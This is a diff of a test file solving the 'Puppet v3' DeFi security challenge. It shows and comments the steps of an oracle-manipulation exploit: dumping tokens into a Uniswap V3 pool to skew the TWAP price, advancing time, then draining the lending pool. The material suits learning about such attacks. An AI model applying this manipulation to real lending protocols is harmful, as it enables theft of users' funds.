@@ -140,38 +140,29 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const printPastTime = async () => {
-            console.log({timestamp: (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp})
-        }
 
-        await printPastTime();
-        hackPuppetv3 = await (await ethers.getContractFactory('HackPuppetV3', deployer)).deploy(
+        // Deploy our HackPuppetV3 contract
+        hackPuppetv3 = await (await ethers.getContractFactory('HackPuppetV3', player)).deploy(
             weth.address,
             token.address,
             uniswapPool.address,
             lendingPool.address
         );
-
-        await printPastTime();
-        await token.connect(player).transfer(hackPuppetv3.address, PLAYER_INITIAL_TOKEN_BALANCE);
         
-        await printPastTime();
+        // Transfer all our token balance to our hacker contract
+        await token.connect(player).transfer(hackPuppetv3.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // Trigger the swap function of our hacker contract
+        // Pass the encodePriceSqrt with a of 1 to 1000000
+        // Sqrt is the max price difference we allow and
+        // That's the price difference we're going to generate making the swap
         await hackPuppetv3.connect(player).swap(
             PLAYER_INITIAL_TOKEN_BALANCE,
             encodePriceSqrt(1, LENDING_POOL_INITIAL_TOKEN_BALANCE)
         );
- 
-        await printPastTime();
-        await time.increase(111);
-        console.log({required: String(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)).slice(0, -18)});
-        console.log({balance: String(await weth.balanceOf(hackPuppetv3.address)).slice(0, -18)})
-        
-        await printPastTime();
+        // Increse time because the price change lates ten minutes in fully make effect
+        await time.increase(110);
+        // Call our contract function that is going to borrow from the lendingPool and transfer to us
         await hackPuppetv3.connect(player).borrowAndTransfer(LENDING_POOL_INITIAL_TOKEN_BALANCE);
-       
-
-        await printPastTime();
-
     });
 
     after(async function () {
